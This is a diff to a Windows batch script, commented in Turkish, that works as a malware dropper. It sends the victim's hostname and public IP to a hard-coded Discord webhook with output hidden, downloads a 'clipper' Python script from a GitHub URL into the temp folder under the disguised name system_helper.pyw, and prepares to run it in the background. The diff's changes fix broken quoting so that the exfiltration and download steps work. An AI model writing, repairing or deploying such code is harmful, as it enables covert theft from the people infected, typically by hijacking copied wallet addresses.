@@ -8,8 +8,8 @@ set "WEBHOOK=https://discord.com/api/webhooks/1514118771776688164/dKNF5PnIXuS8-E
 :: Bilgisayar adını al
 for /f "tokens=*" %%a in ('hostname') do set "HOST=%%a"
 
-:: Discord'a bildirim gönder (PowerShell ile)
-powershell -Command "$wc=New-Object System.Net.WebClient;$wc.Headers.Add('Content-Type','application/json');$wc.UploadString('%WEBHOOK%', '{ \"content\": \"**✅ Yeni bağlantı!** Bilgisayar: %HOST% | IP: ' + (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content + ' | Zaman: ' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + '\" }')" >nul 2>&1
+:: Discord'a bildirim gönder (Düzeltilmiş PowerShell komutu)
+powershell -Command "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('Content-Type','application/json'); $body='{\"content\": \"**✅ Yeni bağlantı!** Bilgisayar: %HOST% | IP: '+(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content+' | Zaman: '+(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')+'\"}'; $wc.UploadString('%WEBHOOK%', $body)" >nul 2>&1
 
 :: Python kontrol et
 python --version >nul 2>&1
@@ -20,8 +20,8 @@ if errorlevel 1 (
     timeout /t 10 /nobreak >nul
 )
 
-:: Clipper scriptini indir (kendi dosya URL'n ile değiştir)
-set "set "CLIPPER_URL=https://raw.githubusercontent.com/bilgi213h/hululu/main/clipper.py""
+:: Clipper scriptini indir
+set "CLIPPER_URL=https://raw.githubusercontent.com/bilgi213h/hululu/main/clipper.py"
 curl -L -o "%TEMP%\system_helper.pyw" "%CLIPPER_URL%"
 
 :: Arka planda çalıştır
